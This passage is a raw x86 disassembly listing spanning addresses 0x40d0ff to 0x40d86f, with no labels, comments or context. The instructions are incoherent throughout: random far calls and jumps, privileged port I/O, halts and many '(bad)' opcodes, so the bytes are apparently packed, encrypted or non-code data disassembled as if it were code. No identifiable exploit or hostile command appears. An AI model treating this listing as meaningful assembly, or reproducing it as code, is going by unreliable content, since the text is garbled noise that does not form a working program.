  40d0ff:	cmp    DWORD PTR [ebx+0x51f4066b],ecx
  40d105:	test   al,0x94
  40d107:	dec    ebp
  40d108:	fwait
  40d109:	adc    eax,0x443960b1
  40d10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10f:	push   ds
  40d110:	cmp    edi,DWORD PTR [ebx-0x46]
  40d113:	pop    ebx
  40d114:	out    0x89,al
  40d116:	and    eax,0x43239eeb
  40d11b:	mov    ah,0xb2
  40d11d:	mov    esp,0x76b5b5d1
  40d122:	lahf   
  40d123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d124:	fs add al,0xb5
  40d127:	xor    DWORD PTR [ebx-0x4d49eca0],0x9512b11d
  40d131:	pop    ecx
  40d132:	add    BYTE PTR [esi],0x5c
  40d135:	or     esp,edi
  40d137:	pop    ebx
  40d138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d139:	xchg   ecx,eax
  40d13a:	xor    cl,bh
  40d13c:	dec    esp
  40d13d:	adc    DWORD PTR [ebp+0x45e7d0fc],edx
  40d143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d144:	mov    BYTE PTR fs:[eax-0x22b474cb],bl
  40d14b:	mov    ch,0x73
  40d14d:	xor    dl,BYTE PTR [eax]
  40d14f:	shl    DWORD PTR [eax],1
  40d151:	shl    BYTE PTR [ecx+0x3b],cl
  40d154:	mov    eax,0x6f501af4
  40d159:	cmc    
  40d15a:	push   ds
  40d15b:	mov    eax,ds:0x46d139b2
  40d160:	jg     0x40d189
  40d162:	ja     0x40d17f
  40d164:	test   BYTE PTR [ebx],0x5c
  40d167:	inc    ebx
  40d168:	sbb    eax,0x83ef1ccb
  40d16d:	jnp    0x40d108
  40d16f:	sub    al,0xb4
  40d171:	mov    dl,0x8d
  40d173:	loop   0x40d1b1
  40d175:	fwait
  40d176:	mov    ebx,0x507c02f2
  40d17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d17c:	push   edx
  40d17d:	dec    edi
  40d17e:	pop    ss
  40d17f:	add    BYTE PTR [esi-0x70e40c82],0xf9
  40d186:	and    ecx,DWORD PTR [ebx]
  40d188:	rcl    DWORD PTR [edx-0x65],0xab
  40d18c:	or     cl,ah
  40d18e:	jnp    0x40d190
  40d190:	jle    0x40d1e4
  40d192:	pop    es
  40d193:	cwde   
  40d194:	stos   BYTE PTR es:[edi],al
  40d195:	jg     0x40d1b7
  40d197:	sbb    al,0x32
  40d199:	ret    
  40d19a:	arpl   WORD PTR [ecx+0x57],si
  40d19d:	push   ecx
  40d19e:	stos   BYTE PTR es:[edi],al
  40d19f:	push   edx
  40d1a0:	sahf   
  40d1a1:	in     eax,0xff
  40d1a3:	shl    DWORD PTR [ecx-0x633266c8],cl
  40d1a9:	fild   DWORD PTR [edi]
  40d1ab:	lds    edx,FWORD PTR [ecx]
  40d1ad:	or     ch,ch
  40d1af:	sub    al,0x8
  40d1b1:	lds    ebp,FWORD PTR [esi]
  40d1b3:	push   ds
  40d1b4:	jb     0x40d1ce
  40d1b6:	add    eax,0x173fb286
  40d1bb:	lods   eax,DWORD PTR ds:[esi]
  40d1bc:	xor    DWORD PTR [edi],edx
  40d1be:	mov    ch,0x92
  40d1c0:	jp     0x40d1cd
  40d1c2:	jle    0x40d200
  40d1c4:	aam    0x10
  40d1c6:	bound  edi,QWORD PTR [edx]
  40d1c8:	inc    esp
  40d1c9:	ins    BYTE PTR es:[edi],dx
  40d1ca:	call   0xae09:0x120eb43b
  40d1d1:	push   ebx
  40d1d2:	mov    WORD PTR [edi+0xa4eb528],fs
  40d1d8:	lods   eax,DWORD PTR ds:[esi]
  40d1d9:	sbb    BYTE PTR [eax],0xd5
  40d1dc:	lods   eax,DWORD PTR ds:[esi]
  40d1dd:	fisubr DWORD PTR [edi+edx*1+0x41f01e32]
  40d1e4:	bound  esi,QWORD PTR [edx-0x36]
  40d1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e8:	and    DWORD PTR [ebp+0x7b4f79c1],ecx
  40d1ee:	jmp    0x29d18472
  40d1f3:	test   esp,eax
  40d1f5:	sbb    al,0x76
  40d1f7:	hlt    
  40d1f8:	or     ecx,DWORD PTR [ebx]
  40d1fa:	fwait
  40d1fb:	(bad)  
  40d1fc:	pop    edi
  40d1fd:	cmc    
  40d1fe:	std    
  40d1ff:	ret    
  40d200:	xchg   DWORD PTR [edi],esp
  40d202:	call   0x6f5d:0x13f9a333
  40d209:	lock sub al,0xa7
  40d20c:	(bad)  
  40d20d:	xor    eax,0xf6ae7026
  40d212:	mov    eax,ds:0x448eb195
  40d217:	xor    eax,DWORD PTR [edi+0x5c]
  40d21a:	clc    
  40d21b:	cmp    dl,dh
  40d21d:	or     eax,0xbd236d7
  40d222:	sub    BYTE PTR [edi],dl
  40d224:	rcr    DWORD PTR [edx+0x4],0xae
  40d228:	mov    DWORD PTR [edi-0x785a4a66],edi
  40d22e:	test   eax,0x855113f5
  40d233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d234:	(bad)  
  40d235:	dec    edi
  40d236:	ret    0xe50c
  40d239:	(bad)  
  40d23a:	xchg   edi,eax
  40d23b:	adc    BYTE PTR [ecx-0x30c7b44f],cl
  40d241:	pop    esi
  40d242:	sbb    bh,BYTE PTR [edi+0x5188a721]
  40d248:	mov    ds:0xf35a7a0b,eax
  40d24d:	out    dx,al
  40d24e:	test   DWORD PTR [ebp+0xd9a1571],0x65f274f1
  40d258:	rcr    DWORD PTR [ebx+0x4e],0xd8
  40d25c:	rcl    DWORD PTR [esp+ecx*8],cl
  40d25f:	adc    al,BYTE PTR [ecx-0x17834f38]
  40d265:	ret    0x9132
  40d268:	cmp    dl,dh
  40d26a:	call   0xe21e:0x7f81a77
  40d271:	sbb    dh,BYTE PTR ds:0xc0ed2aa7
  40d277:	inc    ebx
  40d278:	and    eax,0xb2c230b7
  40d27d:	cmp    BYTE PTR [ebp-0x2c],ch
  40d280:	ud1    ebp,DWORD PTR [edi]
  40d283:	bound  esi,QWORD PTR [esi]
  40d285:	or     ecx,DWORD PTR [edi-0x51]
  40d288:	enter  0x2adb,0xcd
  40d28c:	fsubr  QWORD PTR ds:0x99d5259a
  40d292:	aad    0x1c
  40d294:	out    0x97,al
  40d296:	imul   esp,DWORD PTR [edi+0x6a3e0227],0x7fac7f81
  40d2a0:	mov    dl,0x48
  40d2a2:	das    
  40d2a3:	mov    ch,0x6c
  40d2a5:	mov    ?,WORD PTR [esi+0x4febf268]
  40d2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ac:	pusha  
  40d2ad:	sub    dh,BYTE PTR [edx]
  40d2af:	(bad)  
  40d2b0:	mov    bl,0x4c
  40d2b2:	and    ch,BYTE PTR [esi+0x30]
  40d2b5:	fwait
  40d2b6:	call   0xaae9:0x846a9599
  40d2bd:	jmp    FWORD PTR [eax-0x54]
  40d2c0:	mov    esp,0xb2fe2855
  40d2c5:	pop    ss
  40d2c6:	mov    ecx,0x869698b2
  40d2cb:	fs pop ebx
  40d2cd:	mov    ds,edx
  40d2cf:	mov    ebp,0xa308ff31
  40d2d4:	bound  ecx,QWORD PTR [ebx]
  40d2d6:	cmp    al,0x38
  40d2d8:	pusha  
  40d2d9:	jb     0x40d274
  40d2db:	es inc edx
  40d2dd:	mov    edx,0x6d483e9a
  40d2e2:	popw   ds
  40d2e4:	jnp    0x40d35b
  40d2e6:	hlt    
  40d2e7:	cdq    
  40d2e8:	loopne 0x40d2cb
  40d2ea:	dec    edx
  40d2eb:	push   ecx
  40d2ec:	cmp    ebp,ebx
  40d2ee:	mov    bh,0xa7
  40d2f0:	dec    esp
  40d2f1:	retf   
  40d2f2:	and    DWORD PTR [esi],eax
  40d2f4:	xchg   ebp,eax
  40d2f5:	mov    esp,0x9856da83
  40d2fa:	cdq    
  40d2fb:	je     0x40d2d9
  40d2fd:	pop    DWORD PTR [eax+eiz*2]
  40d300:	daa    
  40d301:	repz push 0xffffffc3
  40d304:	adc    al,0x53
  40d306:	cwde   
  40d307:	js     0x40d2bb
  40d309:	jae    0x40d316
  40d30b:	pop    ss
  40d30c:	mov    cl,0x49
  40d30e:	dec    ebp
  40d30f:	icebp  
  40d310:	mov    dl,0x94
  40d312:	fcomp  QWORD PTR [edx-0x9]
  40d315:	ret    0xcef7
  40d318:	or     BYTE PTR [esi+edx*2],cl
  40d31b:	push   ecx
  40d31c:	sub    eax,DWORD PTR [edx-0x74578898]
  40d322:	adc    eax,0x8fc1b346
  40d327:	cmp    DWORD PTR [ebp-0x7f],ebx
  40d32a:	daa    
  40d32b:	and    edi,DWORD PTR [edx-0x37]
  40d32e:	xchg   esi,eax
  40d32f:	mov    ah,0xcf
  40d331:	push   edx
  40d332:	sbb    eax,0xc24fbc09
  40d337:	cwde   
  40d338:	jb     0x40d350
  40d33a:	xchg   ecx,eax
  40d33b:	in     eax,0xce
  40d33d:	xchg   ecx,eax
  40d33e:	and    BYTE PTR [edi+0x69fa88d5],0x73
  40d345:	sti    
  40d346:	outs   dx,BYTE PTR ds:[esi]
  40d347:	push   0xffffff9c
  40d349:	add    al,0x92
  40d34b:	or     eax,0x3ed452b2
  40d350:	pusha  
  40d351:	pop    ecx
  40d352:	pop    esi
  40d353:	fidivr DWORD PTR [esi]
  40d355:	pop    ss
  40d356:	popf   
  40d357:	pop    ds
  40d358:	dec    DWORD PTR [ebx]
  40d35a:	cmp    eax,0x15336f94
  40d35f:	cld    
  40d360:	mov    dl,0x4c
  40d362:	ret    
  40d363:	sbb    eax,0x5c417820
  40d368:	inc    edi
  40d369:	jge    0x40d32b
  40d36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d36c:	enter  0xd017,0xdb
  40d370:	cmp    ebx,esi
  40d372:	(bad)  
  40d374:	mov    eax,ds:0xb29f9486
  40d379:	add    al,0xd6
  40d37b:	jnp    0x40d3ef
  40d37d:	xor    bh,cl
  40d37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d380:	or     al,0xc0
  40d382:	lea    esp,[esi-0x7ad36da2]
  40d388:	mov    dl,0x3a
  40d38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d38b:	mov    dl,0x6c
  40d38d:	or     esp,esi
  40d38f:	mov    ds:0xd40f0eb1,eax
  40d394:	sub    BYTE PTR [esi+0x3f],al
  40d397:	daa    
  40d398:	push   eax
  40d399:	cmp    ax,ax
  40d39c:	mov    esp,0x62eec545
  40d3a1:	imul   eax,DWORD PTR ds:0x67fbac80,0xffffffa6
  40d3a8:	inc    ebp
  40d3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ab:	jecxz  0x40d340
  40d3ad:	dec    eax
  40d3ae:	hlt    
  40d3af:	arpl   WORD PTR [eax+0x37169ee2],sp
  40d3b5:	fld    QWORD PTR [esi]
  40d3b7:	add    dh,BYTE PTR [edx]
  40d3b9:	inc    esp
  40d3ba:	jg     0x40d38b
  40d3bc:	mov    al,BYTE PTR ds:0x103e540f
  40d3c2:	cmp    ch,BYTE PTR [ebx-0x33]
  40d3c5:	data16 or bh,BYTE PTR [ebx-0xe99bb37]
  40d3cc:	mov    al,0xf6
  40d3ce:	mov    esi,0x8fa8fbcb
  40d3d3:	inc    edi
  40d3d4:	mov    ecx,0xd63f5a27
  40d3d9:	or     ecx,ecx
  40d3db:	pop    ebp
  40d3dc:	out    0xd8,eax
  40d3de:	mov    edx,0x984de8ad
  40d3e3:	sub    BYTE PTR [ebp+0x42473bc],ch
  40d3e9:	retf   
  40d3ea:	mov    bh,0x1
  40d3ec:	loope  0x40d3f9
  40d3ee:	imul   esp,DWORD PTR [edx-0x16f2228],0xf6e54cec
  40d3f8:	mov    cl,0x42
  40d3fa:	sub    al,0xce
  40d3fc:	sbb    al,0xb4
  40d3fe:	pushf  
  40d3ff:	push   edi
  40d400:	sbb    eax,0x6ca79b1d
  40d405:	push   es
  40d406:	mov    ebp,0x3b532365
  40d40b:	loope  0x40d3bf
  40d40d:	aaa    
  40d40e:	and    eax,DWORD PTR [ecx-0x19]
  40d411:	xor    BYTE PTR [edx+0x62],ch
  40d414:	test   BYTE PTR [edx],cl
  40d416:	xchg   ecx,eax
  40d417:	cmp    eax,0x4c5ef461
  40d41c:	ins    DWORD PTR es:[edi],dx
  40d41d:	jmp    0x40d453
  40d41f:	and    eax,0xf28cf5bc
  40d424:	ds push 0x3c
  40d427:	scas   al,BYTE PTR es:[edi]
  40d428:	sub    dh,BYTE PTR [ebx-0x56]
  40d42b:	add    bl,cl
  40d42d:	or     edx,DWORD PTR [ecx]
  40d42f:	sbb    ebx,DWORD PTR [edx+ebx*8-0x1]
  40d433:	inc    edx
  40d434:	inc    eax
  40d435:	sub    ebx,DWORD PTR [edx-0x78ebccc7]
  40d43b:	pop    edx
  40d43c:	or     esp,0xfffffffc
  40d43f:	cdq    
  40d440:	fwait
  40d441:	shl    DWORD PTR [ecx],cl
  40d443:	loope  0x40d443
  40d445:	fs call 0x29a9:0x8b51858
  40d44d:	xchg   edx,eax
  40d44e:	call   0xd0b5:0x643f16be
  40d455:	sub    ah,bh
  40d457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d458:	inc    esi
  40d459:	xchg   dh,bl
  40d45b:	adc    ebx,esp
  40d45d:	bound  edi,QWORD PTR ds:0x6730b2f1
  40d463:	call   0xc9e:0x7052ea0f
  40d46a:	jge    0x40d404
  40d46c:	mov    ecx,0x1e27859d
  40d471:	repnz lds ebx,FWORD PTR [ebx]
  40d474:	mov    dl,0x43
  40d476:	mov    BYTE PTR [ecx-0x7210be46],dh
  40d47c:	pop    ds
  40d47d:	or     DWORD PTR [ecx+0xa822eb2],esi
  40d483:	xor    BYTE PTR [edx-0x80],dh
  40d486:	jp     0x40d474
  40d488:	mov    ebp,0x90892c8c
  40d48d:	cmc    
  40d48e:	xchg   esp,eax
  40d48f:	repnz rep stos DWORD PTR es:[edi],eax
  40d492:	clc    
  40d493:	pop    esp
  40d494:	retf   
  40d495:	pop    ds
  40d496:	pop    ss
  40d497:	mov    ecx,0x7aa10d17
  40d49c:	pop    esp
  40d49d:	dec    ebx
  40d49e:	xchg   BYTE PTR [ecx+0x77d57627],cl
  40d4a4:	mov    ds,WORD PTR [eax+esi*8-0x5a]
  40d4a8:	xor    dl,ah
  40d4aa:	dec    BYTE PTR [edi-0x2f91fa9c]
  40d4b0:	jmp    edi
  40d4b2:	fsub   DWORD PTR [edi+0x14641ba1]
  40d4b8:	aad    0xe0
  40d4ba:	mov    al,ds:0x12ceb27d
  40d4bf:	arpl   sp,bx
  40d4c1:	and    edi,ebx
  40d4c3:	shl    DWORD PTR [ecx],1
  40d4c5:	or     esp,ebp
  40d4c7:	sub    edx,DWORD PTR [esi+0x1e0c2c36]
  40d4cd:	popf   
  40d4ce:	xchg   BYTE PTR [ebx+esi*1-0x4d96f7d8],cl
  40d4d5:	jb     0x40d467
  40d4d7:	aas    
  40d4d8:	mov    bh,0x42
  40d4da:	mov    ds:0xdc23f2d5,al
  40d4df:	and    DWORD PTR [ecx],ecx
  40d4e1:	or     al,0x1a
  40d4e3:	mov    edx,0xe7a6676e
  40d4e8:	rol    BYTE PTR [edi+0x38],1
  40d4eb:	out    0xb1,al
  40d4ed:	pop    edi
  40d4ee:	dec    edi
  40d4ef:	push   0x758caf1
  40d4f4:	cs hlt 
  40d4f6:	or     DWORD PTR [eax-0x19a1cbd9],edi
  40d4fc:	xor    DWORD PTR ds:0x7b99607a,esp
  40d502:	xor    eax,DWORD PTR [edx+0x39df76b1]
  40d508:	(bad)  
  40d509:	in     al,0xe1
  40d50b:	ja     0x40d558
  40d50d:	pop    esp
  40d50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d50f:	call   0xe162:0x611a1f9f
  40d516:	sub    esp,esi
  40d518:	(bad)  
  40d519:	call   0x179c:0x3c46bc8c
  40d520:	pop    ds
  40d521:	push   edx
  40d522:	cli    
  40d523:	rcr    DWORD PTR [edi+0xa],cl
  40d526:	mov    al,0x2a
  40d528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d529:	mov    eax,ds:0xe7f4ea2e
  40d52e:	jno    0x40d50b
  40d530:	mov    cl,0xa2
  40d532:	jmp    0x40d590
  40d534:	jo     0x40d591
  40d536:	adc    ah,BYTE PTR [edi]
  40d538:	in     eax,0xcf
  40d53a:	sub    eax,0x420c9237
  40d53f:	inc    ecx
  40d540:	lea    eax,[esi-0x46]
  40d543:	xor    al,0x55
  40d545:	dec    esp
  40d546:	xor    bh,BYTE PTR [esi-0x7565c4b7]
  40d54c:	jp     0x40d50a
  40d54e:	jp     0x40d5c2
  40d550:	mov    eax,0x21ba718b
  40d555:	xor    eax,0x959be9ac
  40d55a:	pop    edx
  40d55b:	add    DWORD PTR [esi-0x4aadabe4],0x310b3963
  40d565:	fsub   QWORD PTR [ebp-0x67692af9]
  40d56b:	cmp    al,0x2
  40d56d:	xor    eax,0x3f3123a0
  40d572:	rcl    BYTE PTR [ecx-0x2d],0x8d
  40d576:	push   0xffffffde
  40d578:	dec    eax
  40d579:	cmp    BYTE PTR [ebp+0x56e9e6db],bl
  40d57f:	mov    es,WORD PTR [edx+0x5a]
  40d582:	dec    eax
  40d583:	fadd   QWORD PTR [edi+0xb]
  40d586:	shl    edx,0x28
  40d589:	aad    0x55
  40d58b:	pop    ds
  40d58c:	push   ebp
  40d58d:	xor    ebp,DWORD PTR [ebx+eiz*1-0x50]
  40d591:	dec    ecx
  40d592:	mov    WORD PTR [edi],fs
  40d594:	xchg   edi,eax
  40d595:	xor    ah,bl
  40d597:	daa    
  40d598:	jne    0x40d578
  40d59a:	fwait
  40d59b:	inc    ebx
  40d59c:	test   BYTE PTR [eax],dh
  40d59e:	xchg   esp,eax
  40d59f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5a0:	mov    ch,0x71
  40d5a2:	stos   BYTE PTR es:[edi],al
  40d5a3:	lock pop edx
  40d5a5:	stos   DWORD PTR es:[edi],eax
  40d5a6:	repz xor DWORD PTR [esi-0x105d65e4],ecx
  40d5ad:	sahf   
  40d5ae:	ret    
  40d5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5b0:	dec    edx
  40d5b1:	shr    BYTE PTR [ecx],1
  40d5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b4:	lahf   
  40d5b5:	pushf  
  40d5b6:	xchg   esp,eax
  40d5b7:	and    DWORD PTR ds:[ebx+0x24],edx
  40d5bb:	dec    esi
  40d5bc:	mov    ch,0x2b
  40d5be:	into   
  40d5bf:	mov    edx,0xbb1ab20e
  40d5c4:	add    al,0xef
  40d5c6:	fisub  WORD PTR [eax+edx*8+0x246eaf20]
  40d5cd:	scas   eax,DWORD PTR es:[edi]
  40d5ce:	inc    edx
  40d5cf:	jo     0x40d58f
  40d5d1:	call   FWORD PTR [edx-0x318f9c87]
  40d5d7:	bound  esp,QWORD PTR [eax+edi*4-0x6fbe5888]
  40d5de:	sub    BYTE PTR [esi-0x6b1f58bb],al
  40d5e4:	mov    al,0x37
  40d5e6:	xor    ebx,DWORD PTR [ebx+0x10]
  40d5e9:	pop    ss
  40d5ea:	or     esp,ebp
  40d5ec:	mov    ecx,DWORD PTR [ebx-0x3a]
  40d5ef:	enter  0xb08,0xca
  40d5f3:	imul   edi,esp,0xffffff82
  40d5f6:	add    ecx,DWORD PTR [edx-0x26]
  40d5f9:	jae    0x40d671
  40d5fb:	retf   
  40d5fc:	mov    dh,0x95
  40d5fe:	cmp    al,BYTE PTR [esi+0x2070c685]
  40d604:	push   es
  40d605:	sub    esi,DWORD PTR [eax+0x12]
  40d608:	test   BYTE PTR [ecx+edi*1],cl
  40d60b:	imul   esi,DWORD PTR [ebp+0xb638ccf],0xffffffbf
  40d612:	mov    dh,BYTE PTR [esi*2+0x13a7b761]
  40d619:	mov    DWORD PTR [eax-0x469f0693],ebp
  40d61f:	mov    edx,0xc10f30ac
  40d624:	xor    bl,BYTE PTR [edi]
  40d626:	rcl    BYTE PTR [edx-0x58f9480a],cl
  40d62c:	bound  edx,QWORD PTR [eax]
  40d62e:	and    BYTE PTR [eax+0x42],0x1c
  40d632:	cmp    al,BYTE PTR [ecx-0x4e]
  40d635:	and    bl,bl
  40d637:	scas   al,BYTE PTR es:[edi]
  40d638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d639:	(bad)  
  40d63a:	cdq    
  40d63b:	pop    ss
  40d63c:	int    0xa
  40d63e:	xchg   edx,eax
  40d63f:	daa    
  40d640:	imul   edi,DWORD PTR gs:[ebx+0xa6b4eab],0x21
  40d648:	mov    esp,0x2b338814
  40d64d:	sub    al,0x5a
  40d64f:	add    eax,0xbdc738e2
  40d654:	sti    
  40d655:	or     al,0x41
  40d657:	mov    ds,WORD PTR [edi+edx*4-0x7730488e]
  40d65e:	sbb    eax,0xa5e9b2ea
  40d663:	jmp    DWORD PTR [edx+0x68]
  40d666:	(bad)  
  40d667:	out    0xf7,eax
  40d669:	or     ebp,DWORD PTR [edx+0x6e]
  40d66c:	test   eax,0xfa3301d1
  40d671:	dec    ebp
  40d672:	mov    al,ds:0xced71945
  40d677:	mov    eax,0x21da91dd
  40d67c:	push   ecx
  40d67d:	pop    edx
  40d67e:	push   0xffffff9c
  40d680:	ins    BYTE PTR es:[edi],dx
  40d681:	or     BYTE PTR ds:0xe735f76f,cl
  40d687:	daa    
  40d688:	jne    0x40d694
  40d68a:	xor    esp,DWORD PTR [esi-0x48be33fd]
  40d690:	bound  ebp,QWORD PTR [esi+ebx*8+0x67]
  40d694:	mov    ebx,0x54caebcc
  40d699:	test   BYTE PTR [eax],bl
  40d69b:	xchg   ah,dl
  40d69d:	lods   eax,DWORD PTR ds:[esi]
  40d69e:	cdq    
  40d69f:	cwde   
  40d6a0:	outs   dx,BYTE PTR ds:[esi]
  40d6a1:	push   ds
  40d6a2:	pop    ss
  40d6a3:	sahf   
  40d6a4:	jg     0x40d721
  40d6a6:	sbb    dh,dh
  40d6a8:	shl    BYTE PTR [ebx+0x75],cl
  40d6ab:	jmp    0xd1ded2ea
  40d6b0:	pop    edx
  40d6b1:	adc    al,0xcc
  40d6b3:	sbb    al,0x12
  40d6b5:	rcr    DWORD PTR [ecx-0x66],0xbd
  40d6b9:	or     al,0xe6
  40d6bb:	mov    ebp,0x575e5722
  40d6c0:	shr    BYTE PTR [ebp+0x45c1bc2d],cl
  40d6c6:	call   0xde99:0x7480ed98
  40d6cd:	stos   DWORD PTR es:[edi],eax
  40d6ce:	inc    ebp
  40d6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d0:	pusha  
  40d6d1:	pop    edi
  40d6d2:	or     DWORD PTR ds:0xe502b33b,ebx
  40d6d8:	mov    dl,0x33
  40d6da:	mov    cl,0x21
  40d6dc:	adc    ch,ah
  40d6de:	lahf   
  40d6df:	aaa    
  40d6e0:	or     DWORD PTR [ebx],0x52
  40d6e3:	pop    edi
  40d6e4:	in     al,dx
  40d6e5:	xor    DWORD PTR [eax],ebp
  40d6e7:	xchg   ebx,eax
  40d6e8:	push   es
  40d6e9:	adc    esp,ecx
  40d6eb:	xor    BYTE PTR [ecx+0x3c8c7e5f],0x30
  40d6f2:	pop    edx
  40d6f3:	jg     0x40d6af
  40d6f5:	imul   ecx,DWORD PTR [ecx+0x53],0x588b0b46
  40d6fc:	icebp  
  40d6fd:	icebp  
  40d6fe:	jmp    0x68:0x9a2d106b
  40d705:	push   ecx
  40d706:	mov    edx,0x709b9e13
  40d70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d70c:	(bad)  
  40d70f:	xor    dl,BYTE PTR [ecx+0x5c]
  40d712:	or     edx,DWORD PTR [edi+0x5c]
  40d715:	aaa    
  40d716:	call   0x34:0x41407176
  40d71d:	outs   dx,DWORD PTR ds:[esi]
  40d71e:	push   edi
  40d71f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d720:	sub    BYTE PTR [esi-0x295e7a96],ch
  40d726:	mov    ebx,0x1bb38858
  40d72b:	daa    
  40d72c:	shl    ch,0xe4
  40d72f:	sbb    cl,ch
  40d731:	clc    
  40d732:	xchg   edi,eax
  40d733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d734:	xchg   esi,eax
  40d735:	loopne 0x40d78c
  40d737:	sbb    DWORD PTR [edx-0x162c9540],esp
  40d73d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d73e:	xchg   eax,eax
  40d740:	out    dx,eax
  40d741:	inc    edx
  40d742:	fcomi  st,st(3)
  40d744:	pop    ebx
  40d745:	sbb    ah,dh
  40d747:	add    eax,0xdc42fe42
  40d74c:	ror    BYTE PTR [ebx],1
  40d74e:	add    edx,DWORD PTR [ebp-0x7c]
  40d751:	popf   
  40d752:	mov    ds,edx
  40d754:	aaa    
  40d755:	loopne 0x40d6ec
  40d757:	test   al,dh
  40d759:	fwait
  40d75a:	jnp    0x40d783
  40d75c:	mov    ebp,0x63cb3ccf
  40d761:	imul   ebp,ebp,0x9
  40d764:	repnz inc ebp
  40d766:	pop    es
  40d767:	not    BYTE PTR [ebp+eiz*1-0x63]
  40d76b:	stc    
  40d76c:	jmp    0xa444:0xb314be72
  40d773:	repz jb 0x40d797
  40d776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d778:	rcl    esp,cl
  40d77a:	idiv   BYTE PTR [edi-0x25a3c53e]
  40d780:	mov    ch,0x22
  40d782:	xchg   edx,eax
  40d783:	cmp    al,BYTE PTR [ecx+0x72502d81]
  40d789:	iret   
  40d78a:	lahf   
  40d78b:	cmp    al,0x8e
  40d78d:	mov    bl,0x81
  40d78f:	pop    edi
  40d790:	ds or  ebx,edi
  40d793:	ss jl  0x40d788
  40d796:	adc    al,0x7e
  40d798:	cli    
  40d799:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79b:	push   eax
  40d79c:	or     eax,DWORD PTR es:[eax-0x495b2b37]
  40d7a3:	je     0x40d799
  40d7a5:	xor    BYTE PTR [ebx],ch
  40d7a7:	mov    bh,0x32
  40d7a9:	jl     0x40d7f0
  40d7ab:	mov    ecx,0x682f2f3a
  40d7b0:	mov    dl,0xaa
  40d7b2:	jmp    0x40d823
  40d7b4:	mov    bl,0xe0
  40d7b6:	pop    esp
  40d7b7:	sub    eax,0xd4b70b68
  40d7bc:	add    bl,ah
  40d7be:	fst    QWORD PTR [edi-0x56]
  40d7c1:	in     al,dx
  40d7c2:	call   0x6743:0x6d5c401b
  40d7c9:	jbe    0x40d76d
  40d7cb:	mov    al,ds:0x2b7f8f43
  40d7d0:	or     DWORD PTR [ebx],0xffffff95
  40d7d3:	pcmpgtw mm6,mm7
  40d7d6:	call   0xcd93:0x5bbef91a
  40d7dd:	out    0x1b,eax
  40d7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e0:	mov    ebx,0x74ed4a8c
  40d7e5:	call   0xef93ec64
  40d7ea:	call   0x6bd8:0x6d7d064d
  40d7f1:	push   ss
  40d7f2:	stos   BYTE PTR es:[edi],al
  40d7f3:	dec    esp
  40d7f4:	push   esi
  40d7f5:	dec    ecx
  40d7f6:	arpl   WORD PTR [eax-0x43f1f38],sp
  40d7fc:	cmp    al,0x5b
  40d7fe:	add    BYTE PTR [ebx],ah
  40d800:	lea    ebx,gs:[edx+0x3fa505f0]
  40d807:	push   ebp
  40d808:	lods   eax,DWORD PTR ds:[esi]
  40d809:	xchg   esp,eax
  40d80a:	push   es
  40d80b:	pop    edi
  40d80c:	add    al,0x8
  40d80e:	or     cl,BYTE PTR [edi+0x60]
  40d811:	push   ebx
  40d812:	cmc    
  40d813:	jge    0x40d83f
  40d815:	xchg   ebp,eax
  40d816:	cdq    
  40d817:	out    0xb5,eax
  40d819:	sbb    DWORD PTR [edx+0x5e],0x8d3abe69
  40d820:	sti    
  40d821:	inc    edi
  40d822:	popa   
  40d823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d824:	pop    ecx
  40d825:	pushf  
  40d826:	adc    BYTE PTR [edx-0x40ede6fd],0x84
  40d82d:	jl     0x40d7c9
  40d82f:	jae    0x40d7c1
  40d831:	rcl    DWORD PTR [edi],1
  40d833:	ins    DWORD PTR es:[edi],dx
  40d834:	cmp    BYTE PTR [ebx+0x57],bl
  40d837:	mov    al,ds:0xcc7e3682
  40d83c:	out    dx,eax
  40d83d:	dec    ebx
  40d83e:	jno    0x40d7de
  40d840:	add    eax,esp
  40d842:	call   0x2d79:0x2e543940
  40d849:	pop    edi
  40d84a:	stc    
  40d84b:	test   al,0xfd
  40d84d:	idiv   DWORD PTR [edi-0x2a]
  40d850:	xchg   edx,eax
  40d851:	sbb    bh,BYTE PTR [esi-0x15]
  40d854:	sub    cl,ch
  40d856:	popf   
  40d857:	or     BYTE PTR [edx+0x4c],dl
  40d85a:	mov    BYTE PTR [ecx+eiz*1+0x6d47f759],ch
  40d861:	mov    ah,0xdc
  40d863:	aas    
  40d864:	out    0xf7,al
  40d866:	push   ecx
  40d867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d868:	inc    edi
  40d869:	loope  0x40d8ba
  40d86b:	shl    BYTE PTR [ecx-0x29],0x9c
  40d86f:	test   BYTE PTR [esi-0x69],0x9a
